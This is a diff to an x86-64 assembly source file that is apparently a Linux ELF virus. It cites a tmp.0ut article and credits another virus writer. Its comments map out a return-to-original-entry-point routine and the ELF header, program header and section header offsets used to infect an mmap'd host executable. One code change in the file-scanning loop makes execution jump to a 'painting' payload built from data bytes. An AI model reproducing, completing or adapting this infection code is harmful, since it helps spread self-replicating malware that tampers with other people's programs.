@@ -150,7 +150,6 @@ BITS 64
 ;//////////   ***Return to OEP instructions*** //////////////
 ; Instructions for returning to original entry point of PIE host ELF
 ; after conclusion of vx routines; appended to end of vx body
-
 ; Shout to MalcolmVX for the guidance and help on figuring out the ret2oep routine 
 ; References:
 ;[16] Return To Original Entry Point Despite PIE", s0lden, tmp.0ut, volume 1, https://tmpout.sh/1/11.html
@@ -168,7 +167,7 @@ BITS 64
 ;[r14 + 173] = 0xe0ff			;0xff 0xe0 = jump eax
 ;[r14 + 175] = 0x24048b48		;mov rax, [rsp]; <- call get_rip
 ;[r14 + 179] = 0xc3				;ret 
-		
+;		
 ;//////////  Local variables //////////////
 ; 	(used for phdr and shdr manipulation routines 
 ;
@@ -203,29 +202,29 @@ BITS 64
 ;////////// ELF Header //////////////
 ;
 ; r14 + 800 = mmap'd copy of host ELF executable to infect
-; r14 + 800 	struc elf_ehdr
-; r14 + 800			.e_ident		resd	1		;unsignedchar
-; r14 + 804			.ei_class		resb	1		;
-; r14 + 805			.ei_data		resb	1		;
-; r14 + 806			.ei_version		resb	1		;
-; r14 + 807			.ei_osabi		resb	1		;
-; r14 + 808			.ei_abiversion	resb	1		;
-; r14 + 809			.ei_padding		resb	6		;bytes9-14
-; r14 + 815			.ei_nident		resb	1		;sizeofidentarray
-; r14 + 816			.e_type			resw	1		;uint16_t,bytes16-17
-; r14 + 818			.e_machine		resw	1		;uint16_t,bytes18-19
-; r14 + 820			.e_version		resd	1		;uint32_t, bytes 20-23
-; r14 + 824			.e_entry		resq	1		;ElfN_Addr, bytes 24-31
-; r14 + 832			.e_phoff		resq	1		;ElfN_Off, bytes 32-39
-; r14 + 840			.e_shoff		resq	1		;ElfN_Off, bytes 40-47
-; r14 + 848			.e_flags		resd	1		;uint32_t, bytes 48-51
-; r14 + 852			.e_ehsize		resb	2		;uint16_t, bytes 52-53
-; r14 + 854			.e_phentsize	resb	2		;uint16_t, bytes 54-55
-; r14 + 856			.e_phnum		resb	2		;uint16_t, bytes 56-57
-; r14 + 858			.e_shentsize	resb	2		;uint16_t, bytes 58-59
-; r14 + 860			.e_shnum		resb	2		;uint16_t, bytes 60-61
-; r14 + 862			.e_shstrndx		resb	2		;uint16_t, bytes 62-63
-; r14 + 864		endstruc
+; r14 + 800	struc elf_ehdr
+; r14 + 800		.e_ident		resd	1		;unsignedchar
+; r14 + 804		.ei_class		resb	1		;
+; r14 + 805		.ei_data		resb	1		;
+; r14 + 806		.ei_version		resb	1		;
+; r14 + 807		.ei_osabi		resb	1		;
+; r14 + 808		.ei_abiversion	resb	1		;
+; r14 + 809		.ei_padding		resb	6		;bytes9-14
+; r14 + 815		.ei_nident		resb	1		;sizeofidentarray
+; r14 + 816		.e_type			resw	1		;uint16_t,bytes16-17
+; r14 + 818		.e_machine		resw	1		;uint16_t,bytes18-19
+; r14 + 820		.e_version		resd	1		;uint32_t, bytes 20-23
+; r14 + 824		.e_entry		resq	1		;ElfN_Addr, bytes 24-31
+; r14 + 832		.e_phoff		resq	1		;ElfN_Off, bytes 32-39
+; r14 + 840		.e_shoff		resq	1		;ElfN_Off, bytes 40-47
+; r14 + 848		.e_flags		resd	1		;uint32_t, bytes 48-51
+; r14 + 852		.e_ehsize		resb	2		;uint16_t, bytes 52-53
+; r14 + 854		.e_phentsize	resb	2		;uint16_t, bytes 54-55
+; r14 + 856		.e_phnum		resb	2		;uint16_t, bytes 56-57
+; r14 + 858		.e_shentsize	resb	2		;uint16_t, bytes 58-59
+; r14 + 860		.e_shnum		resb	2		;uint16_t, bytes 60-61
+; r14 + 862		.e_shstrndx		resb	2		;uint16_t, bytes 62-63
+; r14 + 864	endstruc
 ;
 ;
 ;////////// ELF Program Headers //////////////
@@ -244,9 +243,9 @@ BITS 64
 ; obv adjust accordingly 
 
 ;  r14 + 800 + elf_ehdr.e_phoff + 0	struc elf_phdr
-;  r14 + 800 + elf_ehdr.e_phoff + 0		.p_type			resd 1		; uint32_t   
-;  r14 + 800 + elf_ehdr.e_phoff + 4		.p_flags		resd 1		; uint32_t   
-;  r14 + 800 + elf_ehdr.e_phoff + 8		.p_offset		resq 1		; Elf64_Off  
+;  r14 + 800 + elf_ehdr.e_phoff + 0	.p_type			resd 1		; uint32_t   
+;  r14 + 800 + elf_ehdr.e_phoff + 4	.p_flags		resd 1		; uint32_t   
+;  r14 + 800 + elf_ehdr.e_phoff + 8	.p_offset		resq 1		; Elf64_Off  
 ;  r14 + 800 + elf_ehdr.e_phoff + 16	.p_vaddr		resq 1		; Elf64_Addr 
 ;  r14 + 800 + elf_ehdr.e_phoff + 24	.p_paddr		resq 1		; Elf64_Addr 
 ;  r14 + 800 + elf_ehdr.e_phoff + 32	.p_filesz		resq 1		; uint64_t   
@@ -260,9 +259,9 @@ BITS 64
 ; We can use the same breakdown of offsets for the ELF Section Headers:
 ;
 ;  r14 + 800 + elf_ehdr.e_shoff + 0	struc elf_shdr
-;  r14 + 800 + elf_ehdr.e_shoff + 0		.sh_name		resd 1		; uint32_t   
-;  r14 + 800 + elf_ehdr.e_shoff + 4		.sh_type		resd 1		; uint32_t   
-;  r14 + 800 + elf_ehdr.e_shoff + 8		.sh_flags		resq 1		; uint64_t   
+;  r14 + 800 + elf_ehdr.e_shoff + 0	.sh_name		resd 1		; uint32_t   
+;  r14 + 800 + elf_ehdr.e_shoff + 4	.sh_type		resd 1		; uint32_t   
+;  r14 + 800 + elf_ehdr.e_shoff + 8	.sh_flags		resq 1		; uint64_t   
 ;  r14 + 800 + elf_ehdr.e_shoff + 16	.sh_addr		resq 1		; Elf64_Addr 
 ;  r14 + 800 + elf_ehdr.e_shoff + 24	.sh_offset		resq 1		; Elf64_Off  
 ;  r14 + 800 + elf_ehdr.e_shoff + 32	.sh_size		resq 1		; uint64_t   
@@ -508,7 +507,7 @@ check_file:
 		add cx, [rcx + r14 + 616] 		; linuxdirent.d_reclen
 		cmp qword rcx, [r14 + 500]
 		jl check_file
-		;jmp _restore
+		jmp painting
 	painting:
 	call payload
 		db 0x21,0x21,0x21,0x21,0x21,0x21,0x21,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x21,0x21,0x21,0x27,0x27,0x27,0x27,0x21,0x21,0x21,0x21,0x21,0x21,0x6f,0x6f,0x6f,0x6f,0x6f,0x6f,0x6f,0x6f
